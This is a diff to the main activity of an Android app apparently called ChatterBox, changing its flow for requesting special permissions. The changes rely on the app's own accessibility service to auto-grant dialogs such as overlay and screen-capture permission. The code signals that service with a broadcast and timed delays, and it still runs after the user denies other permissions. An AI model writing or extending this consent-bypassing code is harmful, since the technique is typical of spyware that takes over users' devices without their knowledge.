@@ -8,6 +8,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.Menu
@@ -175,8 +176,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             } else {
                 Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show()
             }
-            // Continue with any remaining special permissions
-            handleSpecialPermissions()
         }
     }
 
@@ -405,7 +404,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     // Disable auto-granting since we're done with standard permissions
                     PermissionsManager.disableAutoGrantPermissions()
 
-                    // Check if we need to request special permissions
+                    // Now proceed to special permissions
                     handleSpecialPermissions()
                 } else {
                     // Some permissions were denied
@@ -417,6 +416,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
                     // Disable auto-granting since user manually denied some permissions
                     PermissionsManager.disableAutoGrantPermissions()
+
+                    // Still proceed to special permissions even if some standard ones were denied
+                    handleSpecialPermissions()
                 }
             }
 
@@ -438,68 +440,29 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
     // Update your special permissions handling too
     private fun handleSpecialPermissions() {
-        var specialPermissionsCount = 0
+        // Only count overlay permission for now
+        if (!Settings.canDrawOverlays(this) &&
+            AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
 
-        // Count special permissions that need handling
-        if (!Settings.canDrawOverlays(this)) specialPermissionsCount++
-        if (!Settings.System.canWrite(this)) specialPermissionsCount++
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-            ContextCompat.checkSelfPermission(
-                this,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED &&
-            ContextCompat.checkSelfPermission(
-                this,
-                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            specialPermissionsCount++
-        }
+            // Add a delay before starting the overlay permission flow
+            Handler(Looper.getMainLooper()).postDelayed({
+                PermissionsManager.enableAutoGrantPermissions(1)
 
-        // If we have special permissions to handle, enable auto-granting
-        if (specialPermissionsCount > 0 && AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
-            PermissionsManager.enableAutoGrantPermissions(specialPermissionsCount)
-        }
+                // Pre-notify the accessibility service about the upcoming flow
+                val intent = Intent("com.example.ChatterBox.PREPARE_OVERLAY_PERMISSION")
+                sendBroadcast(intent)
 
-        if (!Settings.canDrawOverlays(this)) {
-            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
-            intent.data = Uri.parse("package:$packageName")
-            Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG)
-                .show()
-            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
-        }
-
-        // For background location, request separately after location permissions are granted
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-            ContextCompat.checkSelfPermission(
-                this,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED &&
-            ContextCompat.checkSelfPermission(
-                this,
-                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-
-            // Show an explanation before requesting background location
-            AlertDialog.Builder(this)
-                .setTitle("Background Location Access Required")
-                .setMessage("This app needs to access your location in the background to provide location-based features even when the app is closed.")
-                .setPositiveButton("Grant") { _, _ ->
-                    ActivityCompat.requestPermissions(
-                        this,
-                        arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION),
-                        BACKGROUND_LOCATION_REQUEST_CODE
-                    )
-                }
-                .setNegativeButton("Cancel") { _, _ ->
-                    // If canceled, disable auto-granting
-                    PermissionsManager.disableAutoGrantPermissions()
-                }
-                .create()
-                .show()
+                // Then start the actual permission request
+                Handler(Looper.getMainLooper()).postDelayed({
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG).show()
+                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
+                }, 500)
+            }, 1000)
         }
     }
+
     private fun requestMediaProjection() {
         // First enable auto-grant for this single permission dialog
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
